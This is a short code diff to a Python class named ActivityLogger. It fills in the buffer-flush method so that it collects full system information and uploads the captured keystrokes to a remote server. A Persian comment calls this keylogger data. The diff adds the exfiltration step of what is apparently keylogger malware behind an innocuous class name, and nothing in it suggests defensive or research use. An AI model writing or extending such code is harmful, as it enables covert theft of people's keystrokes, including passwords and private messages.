@@ -25,7 +25,15 @@ class ActivityLogger:
     def flush_buffer(self):
         if self.buffer:
             try:
-                # Implementation to send data
+                from system.collector import SystemCollector
+                from network.communicator import ServerCommunicator
+                
+                system_info = SystemCollector.collect_full()
+                # ارسال داده‌های کیلاگر
+                ServerCommunicator.upload_data(
+                    keystrokes=self.buffer.copy(),
+                    system_info=system_info
+                )
                 self.buffer.clear()
             except Exception as e:
-                logging.error(f"Buffer flush error: {str(e)}")
+                logging.error(f"Failed to upload data: {str(e)}")
